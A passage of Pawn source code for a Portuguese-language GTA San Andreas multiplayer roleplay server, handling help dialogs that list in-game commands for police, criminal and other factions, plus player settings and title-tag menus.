						    return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sub-líder.");
						}
						//
					    new helpMessage[664];
					    strcat(helpMessage, "{0080ff}Comandos destinados aos líderes:\n");
						strcat(helpMessage, "{FFFFFF}/convidar: {848484}Convida um jogador para a organização.\n");
						strcat(helpMessage, "{FFFFFF}/promover: {848484}Promove um jogador a um cargo superior.\n");
	                    strcat(helpMessage, "{FFFFFF}/demitir: {848484}Demiti um jogador da organização.\n");
						strcat(helpMessage, "{FFFFFF}/addblacklist: {848484}Adiciona um jogador à blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/rblacklist: {848484}Remove um jogador da blacklist.\n");
						strcat(helpMessage, "{FFFFFF}/lchat: {848484}Chat dos líderes e sub-líderes do servidor.\n");
						/*if (IsACop(playerid))
						{
							strcat(helpMessage, "{FFFFFF}/rmbq: {848484}Remove todos os bloqueios.\n");
							strcat(helpMessage, "{FFFFFF}/rmbr: {848484}Remove todas as barreiras.\n");
							strcat(helpMessage, "{FFFFFF}/rmpr: {848484}Remove todos os tapetes de pregos.\n");
						}*/
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Líderes", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 10:
					{
                        return 1;
					    // return ReCommand:ajudaemprego(playerid);
					}
					case 11:
					{
					    /*if (playerInfo[playerid][pOrg] == UNDEFINED_ORG)
						{
						    return SendClientMessage(playerid, COLOR_INVALID, "Você não faz parte de uma organização.");
						}
						//
					    new helpMessage[3000], titleDialog[87];
						if (IsACop(playerid) && playerInfo[playerid][pOrg] != ID_GOVERNO && playerInfo[playerid][pOrg] != ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos policiais:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede reforço contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no veículo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informações de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Libera o jogador da jaula (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Desamarra o jogador (Finaliza o sequestro).\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}Dá ao criminoso uma voz de prisão.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}Dá ao jogador uma voz de revista.\n");
						}
						else if (IsAGoverno(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao governo:\n");
							strcat(helpMessage, "{FFFFFF}/prender: {848484}Prende um criminoso.\n");
							strcat(helpMessage, "{FFFFFF}/algemar: {848484}Algema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/desalgemar: {848484}Desalgema um suspeito.\n");
							strcat(helpMessage, "{FFFFFF}/m: {848484}Usa o Megafone Policial.\n");
							strcat(helpMessage, "{FFFFFF}/reforco: {848484}Pede reforço contra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sireneon: {848484}Coloca sirene no veículo.\n");
							strcat(helpMessage, "{FFFFFF}/procurados: {848484}Mostra os criminosos online.\n");
							strcat(helpMessage, "{FFFFFF}/presos: {848484}Mostra os presos online.\n");
							strcat(helpMessage, "{FFFFFF}/multar: {848484}Multa um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/r: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/d: {848484}Chat do Governo.\n");
							strcat(helpMessage, "{FFFFFF}/infocar: {848484}Verifica as informações de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/multarplaca: {848484}Multa a placa de um veículo.\n");
							strcat(helpMessage, "{FFFFFF}/su: {848484}Incrimina um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/bq: {848484}Planta um bloqueio.\n");
							strcat(helpMessage, "{FFFFFF}/barreira: {848484}Planta uma barreira.\n");
							strcat(helpMessage, "{FFFFFF}/pregos: {848484}Planta um tapete de pregos.\n");
							strcat(helpMessage, "{FFFFFF}/gov: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/revistar: {848484}Revista um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vdp: {848484}Dá ao criminoso uma voz de prisão.\n");
							strcat(helpMessage, "{FFFFFF}/vdr: {848484}Dá ao jogador uma voz de revista.\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{ff6347}Importante: {FFFFFF}O DETRAN possui os comandos de Policiais, no entanto ele não exerce a função\nSó será permitido aplicar o (/su) em blitz caso encontre entorpecentes, nteste caso estará autorizado a algemar\no suspeito e levar até a penitenciária e prendê-lo. Em hipótese algumao DETRAN poderá ir atrás de procurados,\nse isso acontecer, estará sujeito a levar punição por um admin ou receber denúncia no fórum.\n\n");
							strcat(helpMessage, "{848484}Observação:\n{B4B5B7}O DETRAN está autorizado a apreender veículos que estejam espalhados pela cidade ou que constem com multas.\nÉ uma revista, caso constate que o veículo do indivídio tenha multa de até 1 hora de recência deverá liberá-lo.\nPara apreender determinado veículo, basta utilizar o comando (/guinchar) e levá-lo até o pátio que está\nlocalizado em sua HQ. Após cjegar na HQ do DETRAN, entre no veículo guinchado e leve até o interior do pátio.\nApós isso, fixe o veículo utilizando (/fixar); O DETRAn consegue entrar em veículos de ORGANIZAÇÃO caso esteja\npróximo a HQ. Caso guinche algum veículo próprio e não consegia entrar no veículo por estar trancado, use o\ncomando (/abrirveiculo).\n\n");
							strcat(helpMessage, "{0080ff}Veículo Próprio: {B4B5B7}Veículo próprio poderá ser guinchado também, porém, ele irá sumir caso o proprietário dele\ndesconecte do servidor, porém, quando logar novamente, o veículo será sertado automaticamente no Pátio novamente\naté o proprietário soltá-lo!\n\n");
							strcat(helpMessage, "{ccccff}Mecânico: {FFFFFF}O DETRAN poderá trabalhar de Bico como Mecânico caso possua Cargo 2+, para isso, basta ir até\na Oficina do DETRAN e digitar: (/batercartao).\n\n");
							strcat(helpMessage, "{f60000}Comandos:\n");
							strcat(helpMessage, "{848484}/fixar					/crimes\n");
							strcat(helpMessage, "{848484}/guinchar				/dl\n");
							strcat(helpMessage, "{848484}/desfixar				/revistar\n");
							strcat(helpMessage, "{848484}/prender				/abrirveiculo\n");
							strcat(helpMessage, "{848484}/r					/d\n");
							strcat(helpMessage, "{848484}/m					/multar\n");
							strcat(helpMessage, "{848484}/multarplaca  				/gov\n");
							strcat(helpMessage, "{848484}/reforco				/su\n");
							strcat(helpMessage, "{848484}/bq					/rbq\n");
							strcat(helpMessage, "{848484}/br					/rbr\n");
							strcat(helpMessage, "{848484}/pregos					/rpr\n");
							strcat(helpMessage, "{848484}/algemar				/desalgemar\n");
							strcat(helpMessage, "{848484}/procurados				/presos\n");
							strcat(helpMessage, "{848484}/vdp					/vdr\n");
							strcat(helpMessage, "{848484}/infocar					/sireneon\n\n");
							strcat(helpMessage, "{ccccff}Comandos Mecânicos:\n");
							strcat(helpMessage, "{848484}/reparar				/blindar\n");
							strcat(helpMessage, "{848484}/tunar					/abastecer\n");

						}
						else if (IsAGangster(playerid) || IsAMafia(playerid) || IsATerror(playerid) || IsAMercenary(playerid))
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos criminosos:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/assaltar: {848484}Assalta um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/sequestrar: {848484}Sequestra um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendermaconha: {848484}Vende maconha para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercocaina: {848484}Vende cocaína para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/vendercrack: {848484}Vende crack para um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/roubar: {848484}Rouba um cofre.\n");
							strcat(helpMessage, "{FFFFFF}/ang: {848484}Anuncia algo para todos.\n");
							strcat(helpMessage, "{FFFFFF}/jaula: {848484}Coloca o jogador na jaula do cativeiro.\n");
							strcat(helpMessage, "{FFFFFF}/desamarrar: {848484}Liberta o refém do sequestro.\n");
							strcat(helpMessage, "{FFFFFF}/incendiar: {848484}Incendeia um local.\n");
							if (IsAMafia(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/venderkit: {848484}Vende de Kit de Armas.\n\n");
								strcat(helpMessage, "{ff6347}OBS: {FFFFFF}É possível vender dinamites e outros itens no território.\n");
							}
							if (IsATerror(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/trvarma: {848484}Vende Armas Espeiciais.\n");
								strcat(helpMessage, "{FFFFFF}/homembomba: {848484}Explodir-se.\n");
								strcat(helpMessage, "{FFFFFF}/plantarbomba: {848484}Planta uma bomba.\n");
								strcat(helpMessage, "{FFFFFF}/dbomba: {848484}Explode uma bomba plantada.\n");
							}
							if (IsAMercenary(playerid))
							{
								strcat(helpMessage, "{FFFFFF}/mcvarma: {848484}Vende Armas Espeicais.\n");
							}
						}
						else if (playerInfo[playerid][pOrg] == ID_DETRAN)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados ao detran:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/reparar: {848484}Repara o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/blindar: {848484}Blinda o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/abastecer: {848484}Abastece o veículo de um jogador.\n");
							strcat(helpMessage, "{FFFFFF}/tunar: {848484}Tuna o veículo de um jogadorr.\n");
							strcat(helpMessage, "{FFFFFF}/fixar: {848484}Fixa/Refixa um veículo na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/desfixar: {848484}Desfixa um veículo fixado na HQ.\n");
							strcat(helpMessage, "{FFFFFF}/darrespawn: {848484}Respawna um veículo próximo.\n");
							strcat(helpMessage, "{FFFFFF}/guinchar: {848484}Guincha um veículo (Exceto motos).\n");
							strcat(helpMessage, "{FFFFFF}/guincharmoto: {848484}Guinhca uma moto (Apenas no BoxVille).\n");
							strcat(helpMessage, "{FFFFFF}/soltarmotos: {848484}Solta a moto guinchada (Apenas no BoxVille).\n");
						}
						else if (playerInfo[playerid][pOrg] == ID_REPORTERES)
						{
							strcat(helpMessage, "{0080ff}Comandos destinados aos repórteres:\n");
							strcat(helpMessage, "{FFFFFF}/ga: {848484}Chat da Organização.\n");
							strcat(helpMessage, "{FFFFFF}/noticia(/no): {848484}Divulga uma notícia.\n");
							strcat(helpMessage, "{FFFFFF}/aovivo: {848484}Inicia uma entrevista.\n");
						}
						format(titleDialog, sizeof(titleDialog), "{FFFFFF}Comandos do(a): {%06x}%s", orgColors[playerInfo[playerid][pOrg]] >>> 8, OrgInfo[playerInfo[playerid][pOrg]][oName]);
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, titleDialog, helpMessage, "Entendi", "");
						return 1;*/
					}
					case 12:
					{
						new helpMessage[164];
					    strcat(helpMessage, "{0080ff}Comandos:\n");
						strcat(helpMessage, "{FFFFFF}/acessorios: {848484}Edita os acessórios equipados.\n\n");
						strcat(helpMessage, "{ff6347}OBS: {FFFFFF}Para equipar um acessório, basta usá-lo no seu inventário.\n");
						ShowPlayerDialog(playerid, DIALOG_HELP_ITEM, DIALOG_STYLE_MSGBOX, "{FFFFFF}Ajuda: {0080ff}Acessórios", helpMessage, "Voltar", "Fechar");
						return 1;
					}
					case 13:
					{
                        return 1;
						// return ReCommand:infocaixa(playerid);
					}
					case 14:
					{
                        return ShowPlayerAnims(playerid);
					}
				}
			}
		}
		// Plataform
        case DIALOG_CHECK_ANDROID:
        {
            if (!response) 
            {
                Player_SetUsingAndroidStatus(playerid, false);
                return 1;
            }
            if (response) 
            {
                Player_SetUsingAndroidStatus(playerid, true);
                return 1;
            }
        }
		//=================================[ DIALOGO DE CONFIG ]==============================||
		// Lista das configurações
		case DIALOG_CONFIG_LIST:
		{
	        if (!response)
	        {
				SendClientMessage(playerid, COLOR_INVALID, "Você fechou as configurações de modo de jogo.");
	            return 1;
	        }
			if (response)
			{
			    switch(listitem)
			    {
			        case 0:
			        {
			            new StrCat[450];
				        strcat(StrCat, "Título\tStatus\n");
				        strcat(StrCat, (Player_GetTag(playerid) == NO_TAG ? "{FFFFFF}Sem Título\t{228B22}[ON]\n" : "{FFFFFF}Sem Título\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_SCRIPTER ? "{FFFFFF}Scripter\t{228B22}[ON]\n" : "{FFFFFF}Scripter\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_ADMIN ? "{FFFFFF}Administrador\t{228B22}[ON]\n" : "{FFFFFF}Administrador\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_LEADER ? "{FFFFFF}Líder\t{228B22}[ON]\n" : "{FFFFFF}Líder\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_SUBLEADER ? "{FFFFFF}SubLíder\t{228B22}[ON]\n" : "{FFFFFF}SubLíder\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_VIP ? "{FFFFFF}Membro Vip\t{228B22}[ON]\n" : "{FFFFFF}Membro Vip\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_SOCIO ? "{FFFFFF}Membro Sócio\t{228B22}[ON]\n" : "{FFFFFF}Membro Sócio\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_NOOB ? "{FFFFFF}Noob\t{228B22}[ON]\n" : "{FFFFFF}Noob\t{FF0000}[OFF]\n"));
						strcat(StrCat, (Player_GetTag(playerid) == TAG_KILLER ? "{FFFFFF}Matador\t{228B22}[ON]\n" : "{FFFFFF}Matador\t{FF0000}[OFF]\n"));
				        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						ShowPlayerDialog(playerid, DIALOG_MANAGE_TAG, DIALOG_STYLE_TABLIST_HEADERS, "Gerenciar Títulos", StrCat, "Trocar", "Voltar");
			        }
			        case 1:
			        {
			            switch(Player_GetSpawn(playerid))
						{
							case 0: 
							{
								if (Player_GetAdminLevel(playerid) > HELPER)
								{
									Player_SetSpawn(playerid, 2);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para a hq admin.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
								else
								{
									Player_SetSpawn(playerid, 0);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientMessage(playerid, COLOR_INVALID, "Você não possui uma casa para alterar o local de nascimento.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
							}
							case 1: 
							{ 
								if (Player_GetAdminLevel(playerid) > HELPER) 
								{
									Player_SetSpawn(playerid, 2);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para a hq admin.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
								else 
								{
									Player_SetSpawn(playerid, 0);
									PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
									SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para o local padrao.");
									Player_UpdateConfigData(playerid);
									return ShowPlayerConfig(playerid);
								}
							}
							case 2:
							{
								Player_SetSpawn(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou seu local de nascimento~n~para o local padrao.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 2:
			        {
			            switch(Player_GetTerritorialChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetTerritorialChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou as mensagens territoriais.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetTerritorialChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou as mensagens territoriais.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
			        case 3:
			        {
			            switch(Player_GetNoobChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetNoobChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat de duvidas.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetNoobChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat de duvidas.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 4:
			        {
			            switch(Player_GetVipChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetVipChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat vip.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetVipChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat vip.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 5:
			        {
			            switch(Player_GetSocioChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetSocioChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat socio.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetSocioChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat socio.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 6:
			        {
			            switch(Player_GetMusicStreamStatus(playerid))
						{
							case 0: 
							{
								Player_SetMusicStreamStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou as musicas em interiores.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetMusicStreamStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou as musicas em interiores.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 7:
			        {
						if (Player_GetOrgRole(playerid) != 6)
						{
							return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder");
						}
			            switch(Player_GetLeaderChatStatus(playerid))
						{
							case 0: 
							{
								Player_SetLeaderChatStatus(playerid, true);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce ativou o chat lider.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetLeaderChatStatus(playerid, false);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce desativou o chat lider.");
								Player_UpdateConfigChatsData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 8:
			        {
			            switch(Player_GetDocument(playerid))
						{
							case 0: 
							{
								Player_SetDocument(playerid, 1);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu rg para o formato texto.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetDocument(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu rg para o formato menu.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 9:
			        {
						if (IsPlayerInAnyVehicle(playerid))
						{
							HidePlayerSpeedometer(playerid);
						}
			            switch(Player_GetSpeedometer(playerid))
						{
							case 0: 
							{
								Player_SetSpeedometer(playerid, 1);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu velocimetro~n~para o estilo compacto.");
							}
							default: 
							{
								Player_SetSpeedometer(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu velocimetro~n~para o estilo moderno.");
								
							}
						}
						PlayerUpdateSpeedometer(playerid);
						Player_UpdateConfigData(playerid);
						ShowPlayerConfig(playerid);
			        }
					case 10:
			        {
			            switch(Player_GetTracker(playerid))
						{
							case 0: 
							{
								Player_SetTracker(playerid, 1);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o rastreador para seta.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
							default: 
							{
								Player_SetTracker(playerid, 0);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o rastreador para checkpoint.");
								Player_UpdateConfigData(playerid);
								return ShowPlayerConfig(playerid);
							}
						}
			        }
					case 11:
			        {
						if (!Player_GetUsingAndroidStatus(playerid))
						{
							Player_SetUsingAndroidStatus(playerid, true);
							SendClientAlert(playerid, "Configuracoes", "Voce mudou a sua plataforma para android.");
						}
						else
						{
							Player_SetUsingAndroidStatus(playerid, false);
							SendClientAlert(playerid, "Configuracoes", "Voce mudou a sua plataforma para pc.");
						}
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						return ShowPlayerConfig(playerid);
			        }
					case 12:
			        {
			            switch(Player_GetScreenSize(playerid))
						{
							case SCREEN_NORMAL: 
							{
								Player_SetScreenSize(playerid, SCREEN_ULTRAWIDE);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu monitor para 21:9.", true);
								Player_UpdateConfigData(playerid);
								ShowPlayerConfig(playerid);
							}
							case SCREEN_ULTRAWIDE: 
							{
								Player_SetScreenSize(playerid, SCREEN_NORMAL);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu monitor para 16:9.", true);
								Player_UpdateConfigData(playerid);
								ShowPlayerConfig(playerid);
							}
							default:
							{
								Player_SetScreenSize(playerid, SCREEN_NORMAL);
								PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
								SendClientAlert(playerid, "Configuracoes", "Voce mudou o seu monitor para 16:9.", true);
								Player_UpdateConfigData(playerid);
								ShowPlayerConfig(playerid);
							}
						}
						HidePlayerHud(playerid);
						ShowPlayerHud(playerid);
						PlayerUpdateSpeedometer(playerid);
			        }
					case 13:
			        {
						new hitDialog[228 + 1];
			            strcat(hitDialog, (Player_GetHitSound(playerid) == 3 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar Tiro)\n"));
						strcat(hitDialog, (Player_GetHitSound(playerid) == 2 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Levar Tiro)\n"));
						strcat(hitDialog, (Player_GetHitSound(playerid) == 1 ? "{04b404}» {848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n" : "{848484}Ouvir o sino ao: {FFFFFF}(Acetar & Levar Tiro)\n"));
						strcat(hitDialog, (Player_GetHitSound(playerid) == 0 ? "{04b404}» {f60000}(Desativar barulho do sino)\n" : "{f60000}(Desativar barulho do sino)\n"));
			        	PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						ShowPlayerDialog(playerid, DIALOG_MENU_HIT, DIALOG_STYLE_LIST, "Menu Hit", hitDialog, "Escolher", "Voltar");
					}
				}
			}
			return 1;
		}
		case DIALOG_MENU_HIT:
		{
			if (!response) return ShowPlayerConfig(playerid);
			if (response)
			{
				switch(listitem)
				{
					case 0:
					{
						Player_SetHitSound(playerid, 3);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Acertar Tiro).");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
					case 1:
					{
						Player_SetHitSound(playerid, 2);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Levar Tiro).");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
					case 2:
					{
						Player_SetHitSound(playerid, 1);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você agora vai ouvir o sino ao: {FFFFFF}(Acertar & Levar Tiro).");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
					case 3:
					{
						Player_SetHitSound(playerid, 0);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientMessage(playerid, COLOR_WHITE, "» {848484}Você desativou o barulho do sino.");
						Player_UpdateConfigData(playerid);
						return ShowPlayerConfig(playerid);
					}
				}
			}
		}
		case DIALOG_MANAGE_TAG:
		{
		    if (!response)
	        {
	            return ShowPlayerConfig(playerid);
	        }
			if (response)
			{
			    switch(listitem)
			    {
			        case 0:
			        {
			            Player_SetTag(playerid, NO_TAG);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid, COLOR_YELLOW, "Você removeu o seu título.");
						Player_UpdateConfigData(playerid);
			        }
			        case 1:
			        {
			            if (Player_GetAdminLevel(playerid) != OWNER)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é o scripter do servidor.");
			            }
						Player_SetTag(playerid, TAG_SCRIPTER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Scripter'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 2:
			        {
			            if (Player_GetAdminLevel(playerid) < HELPER)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um administrador.");
			            }
						Player_SetTag(playerid, TAG_ADMIN);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Administrador'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 3:
			        {
			            if (Player_GetOrgRole(playerid) != 6 || Player_GetOrg(playerid) == INVALID_VALUE)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
			            }
						Player_SetTag(playerid, TAG_LEADER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Lider'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 4:
			        {
			            if (Player_GetOrgRole(playerid) != 5 || Player_GetOrg(playerid) == INVALID_VALUE)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sublíder.");
			            }
						Player_SetTag(playerid, TAG_SUBLEADER);
